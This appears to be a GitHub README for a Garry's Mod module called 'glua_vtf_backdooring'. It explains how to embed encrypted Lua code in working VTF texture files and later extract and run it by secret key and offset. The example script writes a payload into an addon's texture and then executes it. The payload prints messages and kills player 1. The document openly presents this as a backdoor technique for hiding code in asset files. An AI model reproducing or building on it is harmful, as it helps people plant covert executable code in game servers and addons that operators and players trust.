# glua_vtf_backdooring
Injecting lua code in working VTF files and then running it


[Youtube video](https://www.youtube.com/watch?v=YioOwH6c7As&feature=youtu.be)

`void mat_payload.WriteCodeToVTF(char* identifier, char* lua_code, [optional] char* vtf_to_inject)`

`void* mat_payload.ReadCodeFromVTF(char* path, char* key, int64 offset)`

Example lua code

All paths are in BASE_PATH context


```Lua

require("mat_payload")


local code = [[

print'yolahahaha hello from a vtf file'

print'this is sparta'

player.GetByID(1):Kill()
print(SysTime())


]]

mat_payload.WriteCodeToVTF("skybox_item_10_tmp", code, "garrysmod/addons/CSS Content Addon (Jul2014)/materials/buildings/antn01.vtf")


--Wrote to file : [garrysmod/data/skybox_item_10_tmp.vtf] with secret key "68124168458642", and VTF offset is 87600, SAVE ALL OF THESE INFORMATIONS


local func = mat_payload.ReadCodeFromVTF("garrysmod/data/skybox_item_10_tmp.vtf", "68124168458642", 87600)

func()

```
